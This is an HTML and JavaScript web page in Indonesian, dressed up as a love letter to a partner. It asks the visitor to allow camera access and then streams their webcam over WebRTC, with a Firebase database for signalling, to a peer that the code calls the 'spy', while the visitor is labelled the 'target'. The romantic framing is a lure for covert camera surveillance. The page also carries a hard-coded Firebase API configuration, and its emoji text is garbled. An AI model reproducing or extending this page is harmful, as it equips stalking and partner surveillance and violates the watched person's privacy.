<!DOCTYPE html>
<html>
<head>
    <title>ðŸ’Œ Surat Cinta</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            background: linear-gradient(135deg, #ff6b9d, #ff8e53);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: white;
            border-radius: 20px;
            padding: 30px;
            width: 100%;
            max-width: 500px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }
        h1 { color: #ff4081; margin-bottom: 20px; }
        #status { margin: 20px 0; min-height: 24px; }
        #video { width: 100%; border-radius: 10px; margin: 20px 0; display: none; }
        .share-section {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 10px;
            margin: 20px 0;
            display: none;
            border-left: 4px solid #ff4081;
        }
        .room-code {
            font-size: 2em;
            font-weight: bold;
            color: #ff4081;
            letter-spacing: 3px;
            margin: 15px 0;
            font-family: monospace;
        }
        .share-buttons {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin: 15px 0;
            flex-wrap: wrap;
        }
        button {
            background: #ff4081;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 25px;
            cursor: pointer;
            font-size: 14px;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        .copy-btn {
            background: #4CAF50;
        }
        .note {
            font-size: 12px;
            color: #666;
            margin-top: 10px;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>ðŸ’– Untuk Pacarku</h1>
        <p>Sayang, izinkan aku melihat senyuman indahmu...</p>
        
        <button onclick="startCamera()" id="startBtn">
            ðŸ“¸ Izinkan Kamera
        </button>
        
        <div id="status">Klik tombol di atas untuk memulai</div>
        
        <div class="share-section" id="shareSection">
            <h3>ðŸŽ¯ Kirim kode ini ke pacarmu:</h3>
            <div class="room-code" id="roomCode"></div>
            
            <div class="share-buttons">
                <button onclick="copyRoomCode()" class="copy-btn">
                    ðŸ“‹ Salin Kode
                </button>
                <button onclick="shareViaWhatsApp()">
                    ðŸ’¬ WhatsApp
                </button>
                <button onclick="generateQR()" id="qrBtn">
                    ðŸ“± QR Code
                </button>
            </div>
            
            <div id="qrContainer" style="margin: 20px 0; display: none;">
                <p>Scan QR code ini:</p>
                <img id="qrcode" style="width: 200px; height: 200px;">
            </div>
            
            <div class="note">
                Kode akan aktif selama 30 menit
            </div>
        </div>
        
        <video id="video" autoplay playsinline muted></video>
    </div>

    <!-- Firebase -->
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    
    <script>
        // ========== CONFIG ==========
        const firebaseConfig = {
            apiKey: "AIzaSyBYW92p7arkxHse0Lo3z6xoe_7G43vHBRU",
            authDomain: "survei-f11a1.firebaseapp.com",
            databaseURL: "https://survei-f11a1-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "survei-f11a1",
            storageBucket: "survei-f11a1.firebasestorage.app",
            messagingSenderId: "769641850914",
            appId: "1:769641850914:web:3be7b2cf7f6cb09ab9427b"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();
        
        // ========== VARIABLES ==========
        let localStream;
        let peerConnection;
        let roomId;
        let offerListener;
        let candidateListener;
        
        // ========== GENERATE ROOM ID ==========
        function generateRoomId() {
            const chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
            let result = '';
            for (let i = 0; i < 6; i++) {
                result += chars.charAt(Math.floor(Math.random() * chars.length));
            }
            return result;
        }
        
        // ========== START CAMERA ==========
        async function startCamera() {
            const btn = document.getElementById('startBtn');
            const status = document.getElementById('status');
            
            btn.disabled = true;
            btn.innerHTML = "ðŸ”„ Memulai...";
            
            try {
                // 1. GET CAMERA
                localStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user", width: 640, height: 480 },
                    audio: false
                });
                
                const video = document.getElementById('video');
                video.srcObject = localStream;
                video.style.display = 'block';
                video.style.transform = 'scaleX(-1)';
                
                // 2. CREATE ROOM
                roomId = generateRoomId();
                
                // Clean old room data
                await database.ref('rooms/' + roomId).remove();
                
                // Set room data
                await database.ref('rooms/' + roomId).set({
                    created: Date.now(),
                    active: true
                });
                
                // 3. SHOW SHARE SECTION
                document.getElementById('roomCode').textContent = roomId;
                document.getElementById('shareSection').style.display = 'block';
                
                // 4. SETUP WEBRTC
                setupWebRTC();
                
                // 5. SETUP LISTENERS
                setupListeners();
                
                status.innerHTML = "âœ… Kamera aktif! Kirim kode di atas ke pacarmu";
                
                // Auto-copy code
                setTimeout(() => {
                    copyRoomCode();
                }, 500);
                
            } catch (error) {
                status.innerHTML = `âŒ Error: ${error.message}`;
                btn.disabled = false;
                btn.innerHTML = "ðŸ“¸ Izinkan Kamera";
            }
        }
        
        // ========== WEBRTC SETUP ==========
        function setupWebRTC() {
            peerConnection = new RTCPeerConnection({
                iceServers: [
                    { urls: 'stun:stun.l.google.com:19302' },
                    { urls: 'stun:stun1.l.google.com:19302' }
                ]
            });
            
            localStream.getTracks().forEach(track => {
                peerConnection.addTrack(track, localStream);
            });
            
            peerConnection.onicecandidate = (event) => {
                if (event.candidate) {
                    database.ref(`rooms/${roomId}/targetCandidates`).push(event.candidate.toJSON());
                }
            };
            
            peerConnection.onconnectionstatechange = () => {
                if (peerConnection.connectionState === 'connected') {
                    document.getElementById('status').innerHTML = "ðŸ”´ Terhubung dengan pacar!";
                }
            };
        }
        
        // ========== SETUP LISTENERS ==========
        function setupListeners() {
            // Listen for offer from spy
            offerListener = database.ref(`rooms/${roomId}/offer`).on('value', async (snapshot) => {
                const offer = snapshot.val();
                if (offer && peerConnection.signalingState === 'stable') {
                    console.log("ðŸ“¥ Offer received");
                    
                    await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
                    
                    const answer = await peerConnection.createAnswer();
                    await peerConnection.setLocalDescription(answer);
                    
                    await database.ref(`rooms/${roomId}/answer`).set(answer);
                }
            });
            
            // Listen for spy ICE candidates
            candidateListener = database.ref(`rooms/${roomId}/spyCandidates`).on('child_added', async (snapshot) => {
                const candidate = snapshot.val();
                if (candidate) {
                    try {
                        await peerConnection.addIceCandidate(new RTCIceCandidate(candidate));
                    } catch (e) {
                        console.warn("ICE candidate error:", e);
                    }
                }
            });
        }
        
        // ========== SHARE FUNCTIONS ==========
        function copyRoomCode() {
            navigator.clipboard.writeText(roomId).then(() => {
                const status = document.getElementById('status');
                status.innerHTML = "âœ… Kode disalin! Kirim ke pacarmu";
            });
        }
        
        function shareViaWhatsApp() {
            const text = `ðŸ’– Hai sayang! Aku buatkan surat cinta khusus untukmu. Gunakan kode ini: ${roomId} untuk melihatnya di: ${window.location.origin}${window.location.pathname.replace('target_fixed.html', 'spy_fixed.html')}`;
            const url = `https://wa.me/?text=${encodeURIComponent(text)}`;
            window.open(url, '_blank');
        }
        
        function generateQR() {
            const qrBtn = document.getElementById('qrBtn');
            const qrContainer = document.getElementById('qrContainer');
            
            if (qrContainer.style.display === 'none') {
                // Generate QR code using Google Charts API (no library needed)
                const qrUrl = `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${roomId}&choe=UTF-8`;
                document.getElementById('qrcode').src = qrUrl;
                qrContainer.style.display = 'block';
                qrBtn.innerHTML = 'âŒ Tutup QR';
            } else {
                qrContainer.style.display = 'none';
                qrBtn.innerHTML = 'ðŸ“± QR Code';
            }
        }
        
        // ========== CLEANUP ==========
        function cleanup() {
            if (offerListener) database.ref(`rooms/${roomId}/offer`).off('value', offerListener);
            if (candidateListener) database.ref(`rooms/${roomId}/spyCandidates`).off('child_added', candidateListener);
            if (localStream) localStream.getTracks().forEach(track => track.stop());
            if (peerConnection) peerConnection.close();
            if (roomId) database.ref('rooms/' + roomId).remove();
        }
        
        window.addEventListener('beforeunload', cleanup);
        window.addEventListener('pagehide', cleanup);
    </script>
</body>
    </html>
